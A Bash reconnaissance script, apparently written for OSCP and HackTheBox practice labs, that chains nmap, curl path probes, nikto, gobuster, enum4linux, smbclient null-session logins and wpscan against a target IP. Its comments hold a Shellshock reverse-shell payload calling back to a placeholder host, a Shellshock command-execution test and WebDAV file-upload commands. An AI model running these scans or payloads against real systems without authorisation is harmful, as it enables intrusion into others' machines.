#By RedTeam611
#Built for the OSCP/Hackthebox/Virtualhackinglabs
#Script i used for auto enumeration in many pentest labs, script currently still in the works, uploading for backup purposes.
cat << "EOF"
   ___  ____   ____ ____    _____
  / _ \/ ___| / ___|  _ \  | ____|_ __  _   _ _ __ ___  
 | | | \___ \| |   | |_) | |  _| | '_ \| | | | '_ ` _ \ 
 | |_| |___) | |___|  __/  | |___| | | | |_| | | | | | |
  \___/|____/ \____|_|     |_____|_| |_|\__,_|_| |_| |_|

EOF
echo "By @RedTeam611"
echo ""
echo "This scipt will launch many enumeration tools for curl,dirb,nikto,ftp,sql,pop3,smtp,smb,httpproxy"
echo ""
echo "Please enter the target IP address to scan"
#$1=ip
#$2=type

read ip
ip=$ip
echo ""
#echo "Do you want a Quick or Full scan? (enter quick or full) (httpbust with dirb and gobust)"
#echo ""
echo "commands: quick,nmapfull,http,https,smb,ftp,wp"
read type
type=$type

mkdir $ip

cd $ip

#Quick scan
if [ "$type" == "quick"  ];
then
#if [ "$1" == ""  ] && [ "$2" == ""  ];                                            
echo ""
echo "$(tput setaf 1)$(tput setab 7)*****Starting Nmap Fast scan on target*****$(tput sgr 0)"
echo ""
nmap -F $ip | tee nmap-fast.txt
echo ""
echo "$(tput setaf 1)$(tput setab 7)*****Getting quick curl results*****$(tput sgr 0)"
curl -I http://$ip | tee curlmainpage
echo "$(tput setaf 1)$(tput setab 7)*****Curling for robots.txt*****$(tput sgr 0)"
curl -I http://$ip/robots.txt | tee curlrobotstxt
File=nmapfast.txt
echo "$(tput setaf 1)$(tput setab 7)*****Curling some common folders*****$(tput sgr 0)"
echo "Curling for /webdav/"
curl --head --silent http://$ip/webdav | grep HTTP 
echo ""
echo "Curling for /phpmyadmin/"
curl --head --silent http://$ip/phpmyadmin | grep HTTP
echo ""
echo "Curling for /admin/"
curl --head --silent http://$ip/admin | grep HTTP
echo ""
echo "Curling for /login/"
curl --head --silent http://$ip/login | grep HTTP
echo ""
echo "Curling for /cgi-bin/ /cgi /cgi-bin/admin.cgi, for shellshock"
curl --head --silent http://$ip/cgi-bin/ | grep HTTP
curl --head --silent http://$ip/cgi | grep HTTP
curl --head --silent http://$ip/cgi-bin/admin.cgi | grep HTTP
#curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.x.x.x/1234 0>&1' http://10.99.99.99/cgi-bin/admin.cgi

#echo "If Http responds good test for shellshock with curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" #http://ip/cgi-bin"
echo ""
echo "Curling for Wordpress"
echo "/readme.html"
curl --head --silent http://$ip/readme.html/ | grep HTTP
echo "/wp-admin/"
curl --head --silent http://$ip/wp-admin/ | grep HTTP
echo "/wp-login/"
curl --head --silent http://$ip/wp-login/ | grep HTTP
echo ""
echo "/wp/"
curl --head --silent http://$ip/wp/ | grep HTTP
echo ""
echo "Curling for FCKeditor folders"

echo "/FCKeditor/"
curl --head --silent http://$ip/FCKeditor/ | grep HTTP
echo ""
echo "/editor/"
curl --head --silent http://$ip/editor/ | grep HTTP
echo ""
echo "/classes/"
curl --head --silent http://$ip/classes/ | grep HTTP
echo ""



nmap -sC -sV -O $ip | tee nmap-scsv.txt

echo "$(tput setaf 1)$(tput setab 7)****Starting Uniscan*****$(tput sgr 0)"
echo ""
uniscan -u $ip -qweds | tee uniscan
echo "$(tput setaf 1)$(tput setab 7)****Starting Nikto*****$(tput sgr 0)"
nikto -h $ip
#echo "$(tput setaf 1)$(tput setab 7)*****Starting Dirb Common list for Http enum*****$(tput sgr 0)"
echo ""
#dirb  http://$ip /usr/share/wordlists/dirb/common.txt | tee dirbustercommon
#fi
#else 
#if  [ "$3" == "nmapfull"  ];  
#then
#echo "$(tput setaf 1)$(tput setab 7)*****Starting full scan on target*****$(tput sgr 0)"
echo ""
exit
fi

#NMAP Full ports
if [ "$type" == "nmapfull"  ];
then
#echo "$(tput setaf 1)$(tput setab 7)*****Starting Gobuster with medium list for better enum*****$(tput sgr 0)"
echo ""
#dirb  http://$ip /usr/share/wordlists/dirb/common.txt | tee dirbustercommon
#gobuster -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobustermed
echo "$(tput setaf 1)$(tput setab 7)*****Starting NMAP intense scan*****$(tput sgr 0)"
echo ""
nmap -p 1-65535 -T4 -A -v $ip | tee nmap-all-ports.txt
#gobuster -u http://10.x.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.t | tee gobuster
echo "$(tput setaf 1)$(tput setab 7)*****Starting NMAP on all ports, UDP SCAN*****$(tput sgr 0)"
echo ""
nmap -sU -v -p- -T4 -Pn $ip | tee nmap-all-udp-ports.txt
exit
fi

#Http scan
if [ "$type" == "http"  ];
then
##add check for https or it fails!
#makes a new folder on the server if possible
#curl -X MKCOL 'http://IP/new_folder' -sw '%{http_code}'; echo
#3) works for making .txt file on server
#curl -T 'test.txt' 'http://IP/new_folder/' -sw '%{http_code}'; echo

echo "$(tput setaf 1)$(tput setab 7)*****Checking for PUT uploading on 80 and 443*****$(tput sgr 0)"
nmap --script=http-methods.nse -p80,443 $ip
echo ""

echo "$(tput setaf 1)$(tput setab 7)*****Starting Dirb Common & Gobust Medium for Http enum*****$(tput sgr 0)"
echo ""
cd $ip
dirb  http://$ip /usr/share/wordlists/dirb/common.txt | tee dirb-common
gobuster -u $ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 | tee gobust-medium
exit
fi

#HTTPS scan
if [ "$type" == "https"  ];
##add check for https or it fails!
then
echo "$(tput setaf 1)$(tput setab 7)*****Starting Dirb Common & Gobust Medium for Http enum*****$(tput sgr 0)"
echo ""
cd $ip
uniscan -u https://$ip -qweds | tee uni_ssl
dirb  https://$ip /usr/share/wordlists/dirb/common.txt | tee dirb-common_ssl
gobuster -u https://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobust-medium_ssl
exit
fi




#SMB scan
if [ "$type" == "smb"  ];
then
echo "$(tput setaf 1)$(tput setab 7)*****Starting Smb Enum enum4linux and Nmap Smb*****$(tput sgr 0)"
echo ""
cd $ip
nbtscan -r $ip | tee nbtscan-cmd
#read -p "Press enter to continue"
echo ""
echo "$(tput setaf 1)$(tput setab 7)*****Trying smbclient with default root pw none*****$(tput sgr 0)"
echo""
smbclient -L \\$ip -U root -N |tee rootnopassword
#smbclient //10.x.x.x/IPc$ -U guest%
echo ""
#smbclient -L \\$ip | tee smbclient-cmd
enum4linux -a $ip | tee enum4linux
echo "$(tput setaf 1)$(tput setab 7)*****Starting NMAP Smb Enum*****$(tput sgr 0)"
nmap --script smb-enum-shares.nse  $ip | tee nmap-smb-enum
exit
fi

#FTP scan
if [ "$type" == "ftp"  ];
then
echo "$(tput setaf 1)$(tput setab 7)*****Starting FTP Enum*****$(tput sgr 0)"
nmap -sV -Pn -vv -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $ip | tee ftp.txt

echo ""

exit
fi


if [ "$type" == "wp"  ];
then
echo "$(tput setaf 1)$(tput setab 7)*****Starting Wordpress Enum*****$(tput sgr 0)"
wpscan --url http://$ip --enumerate u | tee wpscan.txt
wpscan --url http://$ip --enumerate vt | tee wptheme.txt
nmap -sV --script http-wordpress-enum --script-args limit=25 $ip
echo ""
exit
fi




